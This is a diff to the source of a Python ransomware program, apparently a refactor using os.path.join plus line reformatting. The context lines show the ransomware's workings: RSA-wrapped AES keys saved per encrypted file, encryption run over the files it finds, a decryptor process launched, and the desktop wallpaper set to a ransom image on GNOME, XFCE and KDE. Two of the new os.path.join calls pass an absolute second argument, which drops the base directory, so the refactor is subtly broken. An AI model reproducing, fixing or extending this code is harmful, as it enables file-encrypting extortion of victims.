@@ -25,13 +25,13 @@ from Crypto.Cipher import PKCS1_OAEP
 
 
 
-with open(variables.ransomware_path + '/client_public_key.PEM', 'r') as f:
+with open(os.path.join(variables.ransomware_path, '/client_public_key.PEM'), 'r') as f:
     client_public_key = f.read()
 client_public_key_obj = RSA.importKey(client_public_key)
 
 
 def get_paths():
-    with open(variables.ransomware_path + '/AES_encrypted_keys.txt') as f:
+    with open(os.path.join(variables.ransomware_path, '/AES_encrypted_keys.txt')) as f:
         content = f.read().split("\n")
     
     for aes_and_path in content:
@@ -39,7 +39,8 @@ def get_paths():
 
 
 def open_decryptor():
-    process = subprocess.Popen("pidof decryptor", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    process = subprocess.Popen("pidof decryptor", shell=True, stdout=subprocess.PIPE,
+                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     output = process.stdout.read() + process.stderr.read()
     if(output):
         return
@@ -53,10 +54,13 @@ def open_decryptor():
 def change_wallpaper():
     with open(variables.ransomware_path + "/img.png", 'wb') as f:
         f.write(base64.b64decode(variables.img))
-    gnome = 'gsettings set org.gnome.desktop.background picture-uri {}'.format(variables.ransomware_path + "/img.png")
+    gnome = 'gsettings set org.gnome.desktop.background picture-uri {}'\
+            .format(variables.ransomware_path + "/img.png")
     
-    xfce = '''xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "{}" '''.format(variables.ransomware_path + "/img.png")
-    xfce1 = 'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor1/workspace0/last-image -s "{}"'.format(variables.ransomware_path + "/img.png")
+    xfce = '''xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "{}" '''\
+            .format(variables.ransomware_path + "/img.png")
+    xfce1 = 'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor1/workspace0/last-image -s "{}"'\
+            .format(variables.ransomware_path + "/img.png")
 
     kde = """dbus-send --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
 var Desktops = desktops();                                                                                                                       
@@ -124,8 +128,9 @@ def menu():
     new_files = get_files.find_files(variables.test_path)
     aes_keys_and_base64_path = start_encryption(new_files)
 
-    if(aes_keys_and_base64_path != None):
-        with open(variables.ransomware_path + '/AES_encrypted_keys.txt', 'a') as f:    
+    if(aes_keys_and_base64_path):
+        with open(os.path.join(variables.ransomware_path,
+                               '/AES_encrypted_keys.txt'), 'a') as f:    
             for _ in aes_keys_and_base64_path:
                 
                 # encrypt aes key
